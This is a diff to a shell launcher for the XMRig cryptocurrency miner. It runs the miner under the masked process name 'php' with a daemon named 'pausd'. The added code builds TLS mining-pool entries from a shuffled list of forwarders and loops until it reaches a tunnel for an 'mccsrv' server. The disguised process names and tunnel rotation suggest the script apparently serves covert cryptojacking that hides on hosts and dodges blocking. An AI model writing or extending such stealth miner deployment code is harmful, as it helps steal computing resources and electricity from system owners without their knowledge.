@@ -4,7 +4,11 @@
 OBJ_MASK="${OBJ_MASK:-php}"
 DAEMON="${DAEMON:-pausd}"
 DAEMON_NAME="${DAEMON##* }"
-OBJ_CFG="${OBJ_CFG:-xmrig.1.json.tpl}"
+if [ -z "$TNL_SKIP" -o "$TNL_SKIP" = 1 ]; then
+    OBJ_CFG="${OBJ_CFG:-xmrig_tnl_skip.1.json.tpl}"
+else
+    OBJ_CFG="${OBJ_CFG:-xmrig.1.json.tpl}"
+fi
 OBJ_CFG_MASK="${OBJ_CFG_MASK:-config.json}"
 # ARGS="${ARGS:-${OBJ_MASK} -c ${OBJ_CFG_MASK}}"
 ARGS="${ARGS:-${OBJ_MASK}}" ## configless because config is autoread from standard name
@@ -134,9 +138,44 @@ AESNI=${AESNI:-1}
 ## trim X_ID whitespace
 X_ID=${X_ID// }
 
+
 ## commands
 COMMAND_BEFORE="${COMMAND_BEFORE:-:;}"
 COMMAND_AFTER="${COMMAND_AFTER:-:;}"
+
+## pools
+if [ -z "$TNL_SKIP" -o "$TNL_SKIP" = 1 ]; then
+    pool=$(cat <<'POOL'
+{
+    \"url\": \"${URL}\",
+    \"user\": \"${UA}\",
+    \"pass\": \"${PA}\",
+    \"keepalive\": true,
+    \"use-tls\": true,
+    \"nicehash\": \"${NICEHASH:-false}\"
+}
+POOL
+        )
+
+    ## randomize forwarders list
+    fwd="net/forwarders"
+    echo "$(ushuffle $fwd)" > "$fwd"
+    export POOLS
+    p=0
+    for URL in $(<$fwd); do
+        POOLS="${POOLS}$(eval "printf '%s\n' \"$pool,\"")"
+        p=$((p+1))
+    done
+    ## pick a tunnel for the mccsrv from the forwarders
+    x_fwd="net/x_forwarders"
+    while ! {
+        X_URL=$(random_line "$(<$x_fwd)")
+        check_connection ${X_URL/:*} ${X_URL/*:}
+    }; do :; done
+
+    export X_URL=$(random_line "$(<$x_fwd)")
+fi
+
 
 ## subst
 envsubst -no-empty -i "cfg/${OBJ_CFG}" -o "${OBJ_CFG_MASK}"
